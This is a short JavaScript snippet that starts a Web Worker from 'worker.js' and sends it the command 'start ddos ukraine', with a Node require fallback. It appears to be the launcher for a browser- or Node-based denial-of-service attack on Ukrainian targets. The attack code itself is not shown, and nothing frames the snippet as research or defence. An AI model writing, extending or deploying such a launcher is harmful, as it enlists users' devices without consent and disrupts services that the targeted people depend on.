if (window.Worker) {
  var pollingWorker = new Worker('worker.js');
  pollingWorker.postMessage('start ddos ukraine');
} else {
  var poll = require('./worker.js')
}